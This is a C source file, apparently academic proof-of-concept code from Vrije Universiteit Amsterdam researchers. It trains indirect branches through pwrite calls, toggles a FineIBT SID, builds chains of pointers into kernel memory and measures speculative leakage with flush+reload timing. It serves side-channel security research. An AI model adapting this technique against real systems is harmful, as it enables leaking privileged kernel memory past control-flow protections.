/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */
#define _GNU_SOURCE

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"

void select_fine_ibt_sid(struct config * cfg, int do_fake_sid) {
    char buf[16];
    snprintf(buf, 15, "%d", do_fake_sid);

    assert(pwrite(cfg->fd_select_sid, buf, strlen(buf), 0) > 0);
}

// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------


void set_load_chain_simple_touch(struct config * cfg, int number_of_loads) {

    assert(number_of_loads > 0);

    memset(cfg->ind_map, 0, 0x100);

    cfg->gadget_arg = cfg->ind_map_kern;

    if (number_of_loads == 1) {
        cfg->gadget_arg = cfg->fr_buf_kern;
        return;
    }


    for (size_t i = 0; i < number_of_loads - 2; i++)
    {
        *(uint64_t *)(cfg->ind_map + (i * 0x8)) = (uint64_t) (cfg->ind_map_kern + ((1 + i) * 0x8));
    }

    *(uint64_t *) (cfg->ind_map + ((number_of_loads - 2)* 0x8)) =  (uint64_t) cfg->fr_buf_kern;


}

// ----------------------------------------------------------------------------
// Leak helper functions
//
// ----------------------------------------------------------------------------


static void __attribute__ ((noinline)) call_pwrite(int fd, char * buf, uint64_t buf_len, uint64_t do_fake_sid){

    // equalize history
    asm volatile (
        ".rept 200\n"
            "jmp 1f\n"
            "1:\n"
        ".endr\n"
    );

    int ret = pwrite(fd, buf, buf_len, 0);

    assert(pwrite(fd, buf, buf_len, 0) > 0);

}

char read_buf[32];

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    char buf[17];
    uint64_t len_buf;
    uint64_t hits = 0;

    select_fine_ibt_sid(cfg, cfg->do_fake_sid);

    snprintf(buf, 17, "%lx", (size_t) cfg->gadget_arg);

    len_buf = strlen(buf);


    *(volatile uint64_t *)cfg->ind_map;
    *(volatile uint64_t *)(cfg->ind_map + 64);
    *(volatile uint64_t *)(cfg->ind_map + 128);
    *(volatile uint64_t *)(cfg->ind_map + 192);


    for(int iter=0; iter < iterations; iter++) {


        select_fine_ibt_sid(cfg, 0);


        // train
        call_pwrite(cfg->fd_perform_test, buf, len_buf, 0);
        call_pwrite(cfg->fd_perform_test, buf, len_buf, 0);

        cpuid();


        asm volatile("clflush (%0)\n"::"r"(cfg->reload_addr));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->gadget_arg));

        cpuid();

        // set (fake) sid
        select_fine_ibt_sid(cfg, cfg->do_fake_sid);

        // test
        call_pwrite(cfg->fd_perform_test, buf, len_buf, 1);


        cpuid();

        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;


}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

#define NLOADS 16
void print_leakage_rate(struct config * cfg, uint64_t iterations) {

    uint64_t hits[NLOADS] = {0};
    cfg->reload_addr = cfg->fr_buf;

    for (int l = 0; l < (NLOADS * 2); l++)
    {
        set_load_chain_simple_touch(cfg, (l % NLOADS) + 1);

        hits[l % NLOADS] += do_flush_and_reload(cfg, iterations / 2, 0);

    }

    for (int l = 0; l < NLOADS; l++)
    {
        printf("%6ld ", hits[l]);
        fflush(stdout);
    }


    printf("\n");


}
